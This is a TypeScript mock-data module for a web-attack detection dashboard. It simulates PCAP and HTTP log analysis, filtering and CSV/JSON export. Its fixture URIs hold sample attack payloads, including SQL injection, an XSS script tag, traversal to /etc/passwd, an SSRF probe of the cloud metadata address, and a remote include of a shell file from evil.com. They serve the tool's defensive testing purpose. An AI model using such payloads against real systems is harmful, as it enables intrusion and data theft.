import type { DetectionResult, AnalysisSummary, FilterState } from '../types';

const ATTACK_TYPES: DetectionResult['attack_prediction'][] = ['Benign', 'SQLi', 'XSS', 'CMD Injection', 'Directory Traversal', 'Web Shell', 'Credential Stuffing', 'SSRF', 'LFI/RFI'];

// --- Mock Data Generation ---
const generateMockResult = (id: number): DetectionResult => {
  const attackType = ATTACK_TYPES[Math.floor(Math.random() * ATTACK_TYPES.length)];
  const isAttack = attackType !== 'Benign';
  const timestamp = new Date(Date.now() - Math.random() * 1000 * 3600 * 24).toISOString();
  
  const uris = {
    'Benign': `/index.php?page=about`,
    'SQLi': `/login.php?user=' OR 1=1 --`,
    'XSS': `/search?q=<script>alert(1)</script>`,
    'CMD Injection': `/exec?cmd=ls -la`,
    'Directory Traversal': `/static?file=../../../../etc/passwd`,
    'Web Shell': `/uploads/shell.php`,
    'Credential Stuffing': `/api/login`,
    'SSRF': `/proxy?url=http://169.254.169.254/latest/meta-data/`,
    'LFI/RFI': `/include?page=http://evil.com/shell.txt`
  };

  return {
    id,
    timestamp,
    src_ip: `192.168.1.${Math.floor(Math.random() * 254) + 1}`,
    host: 'victim-server.com',
    uri: uris[attackType] || '/index.html',
    attack_prediction: attackType,
    confidence: isAttack ? Math.random() * 0.6 + 0.4 : Math.random() * 0.3,
    rule_matched: isAttack && Math.random() > 0.5 ? `RULE_${attackType.toUpperCase()}` : null,
    success_flag: isAttack && Math.random() > 0.7,
  };
};

const MOCK_DB: DetectionResult[] = Array.from({ length: 200 }, (_, i) => generateMockResult(i + 1));

// --- Mock API Functions ---

export const analyzePcap = async (file: File): Promise<AnalysisSummary> => {
  console.log(`Simulating analysis for ${file.name}...`);
  // Simulate network delay and processing time
  await new Promise(resolve => setTimeout(resolve, 2000));

  if (file.name.includes('error')) {
    throw new Error("PCAP analysis failed: Invalid file format.");
  }

  const count = MOCK_DB.length;
  // Return a summary with the first few results
  const results = MOCK_DB.slice(0, 10);
  return { count, results };
};

export const analyzeHttpLog = async (file: File): Promise<AnalysisSummary> => {
  console.log(`Simulating analysis for HTTP log ${file.name}...`);
  // Simulate network delay and processing time, slightly faster than PCAP analysis
  await new Promise(resolve => setTimeout(resolve, 1500));

  if (file.name.includes('error')) {
    throw new Error("HTTP log analysis failed: Invalid file format.");
  }

  // Use the same mock DB for simplicity
  const count = MOCK_DB.length;
  const results = MOCK_DB.slice(0, 10);
  return { count, results };
};

export const getResults = async (filters: FilterState, offset: number = 0, limit: number = 20): Promise<DetectionResult[]> => {
  console.log('Fetching results with filters:', filters, 'offset:', offset, 'limit:', limit);
  await new Promise(resolve => setTimeout(resolve, 500));

  let filteredData = MOCK_DB;

  if (filters.ip) {
    filteredData = filteredData.filter(r => r.src_ip.includes(filters.ip));
  }
  if (filters.attack_type && filters.attack_type !== 'All') {
    filteredData = filteredData.filter(r => r.attack_prediction === filters.attack_type);
  }
  if (filters.confidence > 0) {
    filteredData = filteredData.filter(r => (r.confidence * 100) >= filters.confidence);
  }

  return filteredData.slice(offset, offset + limit);
};

export const downloadResults = async (format: 'csv' | 'json'): Promise<void> => {
  console.log(`Downloading results in ${format} format...`);
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  let dataStr: string;
  let mimeType: string;
  let filename: string;

  if (format === 'json') {
    dataStr = JSON.stringify(MOCK_DB, null, 2);
    mimeType = 'application/json';
    filename = 'analysis_results.json';
  } else {
    const headers = Object.keys(MOCK_DB[0]).join(',');
    const rows = MOCK_DB.map(row => 
        Object.values(row).map(value => 
            `"${String(value).replace(/"/g, '""')}"`
        ).join(',')
    );
    dataStr = [headers, ...rows].join('\n');
    mimeType = 'text/csv';
    filename = 'analysis_results.csv';
  }

  const blob = new Blob([dataStr], { type: mimeType });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
};